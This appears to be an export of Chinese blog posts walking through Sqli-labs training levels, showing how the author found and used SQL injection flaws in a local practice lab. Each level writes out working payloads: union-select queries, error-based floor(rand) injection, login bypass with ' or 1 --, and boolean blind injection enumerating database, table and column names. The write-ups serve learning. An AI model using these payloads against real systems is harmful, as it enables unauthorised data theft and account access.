<p><strong>判断是字符还是数字</strong><br>输入<code>http://192.168.43.90/Less-1/?id=1 &#39; --+ &#39;</code><br>sql语句是<code>SELECT * FROM users WHERE id=&#39; 1 &#39; </code><br>他没有报错<br>发现是字符<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200717123019208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入<br><code>http://192.168.43.90/Less-1/?id= &#39;union select 1,user(),3 --+</code><br>可以看到执行成功<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200717121830734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h2><ol>
<li>开始<br>输入<br><code>http://192.168.43.90/Less-2/?id=1</code><br>sql语句是<code>SELECT * FROM users WHERE id=1  LIMIT 0,1</code><br>可以看到有显示<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020071712323491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入<br><code>http://192.168.43.90/Less-2/?id= 1 &#39;</code><br>sql语句是<code>SELECT * FROM users WHERE id=&#39;1&#39; LIMIT 0,1</code><br>发现存在sql注入漏洞<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200717123511934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
<p><strong>判断是字符还是数字</strong><br>输入<code>http://192.168.43.90/Less-1/?id=2 &#39; --+ &#39;</code><br>sql语句是<code>SELECT * FROM users WHERE id=&#39;1 &#39;</code><br>发现报错了<br>发现是数字<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200717123742741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入<code>http://192.168.43.90/Less-2/?id=null union select 1,user(),3 --+</code><br>sql语句是<code>SELECT * FROM users WHERE id=null union select 1,user(),3</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/202007171240458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h2><ol>
<li>开始<br><code>http://192.168.43.90/Less-3/?id= 1 </code><br>sql语句是<code>SELECT * FROM users WHERE id=(&#39;1&#39;) LIMIT 0,1</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200717140951445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入<code>http://192.168.43.90/Less-3d=1/?id=1&#39;</code><br>sql语句是<code>SELECT * FROM users WHERE id=(&#39;1&#39;&#39;) LIMIT 0,1</code><br>报错发现存在漏洞，可以判断是()<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200717141320857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
<p>输入    <code>http://192.168.43.90/Less-3/?id=1&#39;)and (1=1) --+ </code><br>sql语句是<code>SELECT * FROM users WHERE id=(&#39;1&#39;)and (1=1)</code><br>没有报错，<br>输入    <code>http://192.168.43.90/Less-3/?id=1&#39;)and (1=2) --+ </code><br>sql语句是<code>SELECT * FROM users WHERE id=(&#39;1&#39;)and (1=2)</code><br>报错了<br>报错发现存在漏洞<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200717141751792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>或者输入<code>http://192.168.43.90/Less-3/?id=1 &#39;) or 1=1 --+</code><br>sql语句是<code>SELECT * FROM users WHERE id=(&#39;1&#39;) or 1=1</code><br>没有报错<br>或者输入<code>http://192.168.43.90/Less-3/?id=a &#39;) or 1=1 --+</code><br>还是没有报错<br>报错发现存在漏洞<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200717142004146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入<code>http://192.168.43.90/Less-3/?id=a &#39;) union select 1,user(),3 --+ </code><br>漏洞成功被执行</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200717142343752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h2><p>Less4和Less3其实是差不多的知道一个是<code>&#39;</code>一个是<code>&quot;</code></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli-labs Less11-12POST注入</title>
    <url>/2020/09/23/Sqli-labs%20Less11-12/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="Less11"><a href="#Less11" class="headerlink" title="Less11"></a>Less11</h2><h3 id="判断是否可以注入"><a href="#判断是否可以注入" class="headerlink" title="判断是否可以注入"></a>判断是否可以注入</h3><p>用户输入<code>&#39;</code>密码随便输入一个<code>acbd</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200923111144.png"><br>发现他报错了<br>我们在输入用户<code>&#39; --  </code>密码随便输入一个<code>acbd</code><br>什么都没有显示<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200923111900.png"><br>说明是存在sql注入漏洞的</p>
<h3 id="无密码登录"><a href="#无密码登录" class="headerlink" title="无密码登录"></a>无密码登录</h3><p>如果我们知道他一个用户就可以登录进去<br>用户输入一个知道的用户<code>admin</code><br>密码输入<code>&#39; or 1 -- </code><br>发现直接就显示了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200923113836.png"></p>
<h3 id="无用户无密码登录"><a href="#无用户无密码登录" class="headerlink" title="无用户无密码登录"></a>无用户无密码登录</h3><p>应为他这个是显示用户名和密码的我们就可以用<code> LIMIT 0,1</code>来逐个显示<br>用户不要输入<br>密码输入<code>&#39; or 1   LIMIT 1,1 -- </code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200924101839.png"></p>
<h3 id="数据查询"><a href="#数据查询" class="headerlink" title="数据查询"></a>数据查询</h3><h4 id="判断注入位置"><a href="#判断注入位置" class="headerlink" title="判断注入位置"></a>判断注入位置</h4><p>用户输入<code>&#39; union select 1,2 -- </code><br>密码随便输入<br>可以看到是1和2<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200924102240.png"></p>
<h4 id="基本信息查询"><a href="#基本信息查询" class="headerlink" title="基本信息查询"></a>基本信息查询</h4><p>查询用户名<br>用户输入<code>&#39; union select 1,user() -- </code><br>密码随便输入<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200924102512.png"><br>其他注入就和普通的sql注入查询一样了</p>
<h2 id="Less12"><a href="#Less12" class="headerlink" title="Less12"></a>Less12</h2><h3 id="判断是否可以注入-1"><a href="#判断是否可以注入-1" class="headerlink" title="判断是否可以注入"></a>判断是否可以注入</h3><p>当我用户输入<code>&#39;</code><br>密码输入<code>a&quot;</code><br>他显示sql语句报错了<br>发现输入<code>&quot;</code>会报错<br>上面还显示了<code>)</code>说明是<code>(&quot;&quot;)</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200924103034.png"></p>
<h3 id="数据查询-1"><a href="#数据查询-1" class="headerlink" title="数据查询"></a>数据查询</h3><h4 id="判断注入位置-1"><a href="#判断注入位置-1" class="headerlink" title="判断注入位置"></a>判断注入位置</h4><p>其实和上面的Less11差不多就是前面是<code>&quot;)</code><br>用户输入<code>&quot; ) union select  1,2  --  </code><br>密码随便输入<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200924105925.png"></p>
<h4 id="基本信息查询-1"><a href="#基本信息查询-1" class="headerlink" title="基本信息查询"></a>基本信息查询</h4><p>用户输入<code>&quot; ) union select 1,user() --  </code><br>密码随便输入<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200924110138.png"><br>其他注入就和普通的sql注入查询一样了</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli-labs Less5-6报错注入关卡</title>
    <url>/2020/09/18/Sqli-labs%20Less5-6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%85%B3%E5%8D%A1/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><h3 id="寻找sql注入漏洞"><a href="#寻找sql注入漏洞" class="headerlink" title="寻找sql注入漏洞"></a>寻找sql注入漏洞</h3><p>我输入URL地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.112&#x2F;Less-5&#x2F;?id&#x3D;1</span><br></pre></td></tr></table></figure>
<p>显示<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200918094637.png"></p>
<p>我添加1变成2发现还是一样<br>URL地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.112&#x2F;Less-5&#x2F;?id&#x3D;2</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200918094822.png"></p>
<p>但我加一个<code>&#39;</code>就报sql错误<br>URL地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.112&#x2F;Less-5&#x2F;?id&#x3D;2&#39;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200918094954.png"></p>
<h3 id="明显就是可以报错注入了"><a href="#明显就是可以报错注入了" class="headerlink" title="明显就是可以报错注入了"></a>明显就是可以报错注入了</h3><p>URL地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.112&#x2F;Less-5&#x2F;?id&#x3D;2&#39;and(select%20count(*)%20from%20users%20group%20by%20concat((select%20user()),floor(rand(0)*2)))%20--+</span><br></pre></td></tr></table></figure>
<p>成功<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200918095345.png"></p>
<h2 id="Less6"><a href="#Less6" class="headerlink" title="Less6"></a>Less6</h2><h3 id="寻找sql注入漏洞-1"><a href="#寻找sql注入漏洞-1" class="headerlink" title="寻找sql注入漏洞"></a>寻找sql注入漏洞</h3><p>输入<code>&#39;</code>没有报错<br>URL地址</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.0.112/Less-6/?id=1&#x27;</span><br></pre></td></tr></table></figure>
<p>发现没有报错<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200918100216.png"><br>输入<code>&quot;</code>发现报错了<br>URL地址</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.0.112/Less-6/?id=1&quot;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200918100348.png"></p>
<p>在进行判断用<code>and 1=1</code>来判断</p>
<p>=2他就没有显示了 发现是存在sql注入漏洞的<br>URL地址</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.0.112/Less-6/?id=1&quot; and 1=2 <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200918100605.png"><br>他什么都不显示我们就可以进行报错注入了</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>URL地址</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.0.112/Less-6/?id=1&quot; and(<span class="keyword">select</span>%<span class="number">20</span><span class="keyword">count</span>(*)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span><span class="keyword">users</span>%<span class="number">20</span><span class="keyword">group</span>%<span class="number">20</span><span class="keyword">by</span>%<span class="number">20</span><span class="keyword">concat</span>((<span class="keyword">select</span>%<span class="number">20</span><span class="keyword">user</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)))%<span class="number">20</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200918100847.png"></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli-labs Less8布尔盲注</title>
    <url>/2020/09/23/Sqli-labs%20Less8%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="Less8"><a href="#Less8" class="headerlink" title="Less8"></a>Less8</h2><p>第8关我直接复制的前几篇文件的测试的正好是第8管</p>
<h3 id="1-判断是否存在sql注入漏洞"><a href="#1-判断是否存在sql注入漏洞" class="headerlink" title="1.判断是否存在sql注入漏洞"></a>1.判断是否存在sql注入漏洞</h3><p>输入<code>http://192.168.0.102/Less-8/?id=1</code><br>显示出<strong>You are in………..</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813110150938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>添加一个<code>&#39;</code><br>输入<code>http://192.168.0.102/Less-8/?id=1&#39;</code><br>发现没有任何显示，可能存在sql注入漏洞<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020081311100965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在进行判断<br>输入<code>http://192.168.0.102/Less-8/?id=1 &#39; and &#39;1&#39;=&#39;1</code><br>发现正常显示</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813111203293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入<code>http://192.168.0.102/Less-8/?id=1 &#39; and &#39;1&#39;=&#39;2</code></p>
<p>报错<br>说明是存在sql注入漏洞的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813111704607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="2-读取数据"><a href="#2-读取数据" class="headerlink" title="2.  读取数据"></a>2.  读取数据</h3><p>发现他就两个结果，一个正确是输出，一个是错误不输出<br>我们就可以进行布尔盲注、<br>查询其他的比较麻烦这个我就查询当前的库的数据</p>
<ol>
<li>查询当前的库名</li>
</ol>
<p><strong>下面演示的事left函数进行查询的</strong></p>
<p>URL地址<code>http://192.168.0.102/Less-8/?id=1&#39; and left(database(),1)=&#39;s&#39; --+</code><br>结果是s<br>输入a没有显示没有显示<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813121603775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入s都显示了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020081312253892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>查询第二个</strong><br>URL地址<code>http://192.168.0.102/Less-8/?id=1&#39; and left(database(),2)=&#39;se‘ --+</code><br>结果是e<br>输入a没有显示<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813122356678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>输入e显示了说明就是e<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813122341294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>还可以用burp进行查询方便<br>直接就可以查询出来<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813123547241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>其他函数查询方法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">regexp函数</span><br><span class="line">http://192.168.0.102/Less-8/?id=1&#x27; and  database()  regexp &#x27;^s&#x27; <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">like函数</span><br><span class="line">http://192.168.0.102/Less-8/?id=1&#x27; and  database()  like &#x27;d%&#x27; <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">substr()函数和ascii()函数	</span><br><span class="line">http://192.168.0.102/Less-8/?id=1&#x27; and  ascii(substr((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>  <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ord</span>()函数和<span class="keyword">mid</span>()函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  ord(mid((select database()),1,1))=115  --+ </span></span><br></pre></td></tr></table></figure>

<p>以此类推找到数据库名是<code>security</code>其他的库就不查询</p>
<ol start="2">
<li>查询表<br>上面已经叫库明查询出来了</li>
</ol>
<p><strong>下面演示的事left函数进行查询的</strong><br>URL地址<code>http://192.168.0.102/Less-8/ ?id=1&#39; and left((select table_name from information_schema.tables where table_schema=&#39;security&#39; LIMIT 0,1) ,1)=&#39;e&#39; --+  </code><br>结果是e<br>输入a没有显示<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813130513707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入e就显示了说明第一个字符是e</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813130458144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>查询第二个</strong><br>URL地址<code>http://192.168.0.102/Less-8/ ?id=1&#39; and left((select table_name from information_schema.tables where table_schema=&#39;security&#39; LIMIT 0,1) ,2)=&#39;ea&#39; --+ </code><br>结果是m<br>输入a没有显示<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813130704167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入m就显示了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020081313081453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>用burp进行查询提升速度<br>是a<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813131304868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>其他函数查询</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">regexp函数</span><br><span class="line">http://192.168.0.102/Less-8/?id=1&#x27; and (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>)  regexp <span class="string">&#x27;^e&#x27;</span> <span class="comment">--+查询到emails</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">like</span>函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  (select table_name from information_schema.tables where table_schema=&#x27;</span><span class="keyword">security</span><span class="string">&#x27; LIMIT 0,1)  like &#x27;</span>e%<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">substr()函数和ascii()函数	</span></span><br><span class="line"><span class="string">http://192.168.0.102/Less-8/?id=1&#x27;</span> <span class="keyword">and</span>  <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>) ,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>  <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ord</span>()函数和<span class="keyword">mid</span>()函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  ord(mid((select table_name from information_schema.tables where table_schema=&#x27;</span><span class="keyword">security</span><span class="string">&#x27; LIMIT 0,1),1,1))=101  --+ </span></span><br></pre></td></tr></table></figure>
<p>以此类推叫第一个给查询出来了<code>emails</code>其他的表就不查询<br>3. 查询列<br>上面我已经第一个给查询出来了<code>emails</code> 利用这个查询列<br><strong>下面演示的事left函数进行查询的</strong><br>URL地址<code>http://192.168.0.102/Less-8/?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;emails&#39; LIMIT 0,1),1)=&#39;i&#39; --+ </code><br>结果是i<br>输入a没有显示<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813132839338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入i就显示了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813133035958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查询第二个字符<br>URL地址<code>http://192.168.0.102/Less-8/?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;emails&#39; LIMIT 0,1),2)=&#39;id&#39; --+</code><br>结果是d<br>输入a没有显示<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813133124609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入d显示了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813133221111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>用burp就不演示了<br>其他函数查询方法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">regexp函数</span><br><span class="line">http://192.168.0.102/Less-8/?id=1&#x27; and  (<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;emails&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>)  regexp <span class="string">&#x27;^i&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">like</span>函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  (select column_name from information_schema.columns where table_name=&#x27;</span>emails<span class="string">&#x27; LIMIT 0,1)  like &#x27;</span>i%<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">substr()函数和ascii()函数	</span></span><br><span class="line"><span class="string">http://192.168.0.102/Less-8/?id=1&#x27;</span> <span class="keyword">and</span>  <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;emails&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">105</span>  <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ord</span>()函数和<span class="keyword">mid</span>()函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  ord(mid((select column_name from information_schema.columns where table_name=&#x27;</span>emails<span class="string">&#x27; LIMIT 0,1),1,1))=105  --+ </span></span><br></pre></td></tr></table></figure>
